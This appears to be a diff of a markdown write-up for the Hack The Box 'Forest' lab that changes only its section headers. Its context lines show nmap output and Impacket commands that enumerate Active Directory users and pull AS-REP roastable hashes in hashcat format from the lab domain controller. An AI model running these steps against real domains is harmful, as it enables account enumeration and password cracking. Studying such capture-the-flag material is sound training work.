@@ -76,7 +76,7 @@ Host script results:
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 500.27 seconds
 ```
-## impacket GetADUsers.py
+## Impacket: GetADUsers.py
 ```markdown
 root@test:~/tools/Windows/impacket/examples# python GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/ | cut -d " " -f 1 |tee /root/HTB/Forest/users
 Impacket
@@ -117,7 +117,7 @@ mark
 santi
 jan
 ```
-## impacket GetNPUsers.py
+## Impacket: GetNPUsers.py
 ```markdown
 root@test:~/tools/Windows/impacket/examples# python GetNPUsers.py htb.local/ -usersfile /root/HTB/Forest/users -dc-ip 10.10.10.161 -format hashcat -outputfile /root/HTB/Forest/hashes
 Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
